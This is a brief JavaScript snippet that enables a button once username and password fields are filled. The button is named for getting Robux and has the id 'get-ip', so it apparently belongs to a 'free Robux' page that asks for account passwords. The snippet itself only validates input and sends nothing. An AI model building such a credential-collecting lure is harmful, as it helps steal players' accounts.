// Get references to the input fields and the button
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const getRobuxButton = document.getElementById('get-ip');

// Enable or disable the button based on input validation
function validateInputs() {
    if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
        getRobuxButton.disabled = false; // Enable button
        getRobuxButton.style.cursor = 'pointer';
    } else {
        getRobuxButton.disabled = true; // Disable button
        getRobuxButton.style.cursor = 'not-allowed';
    }
}

// Attach event listeners to validate on input
usernameInput.addEventListener('input', validateInputs);
passwordInput.addEventListener('input', validateInputs);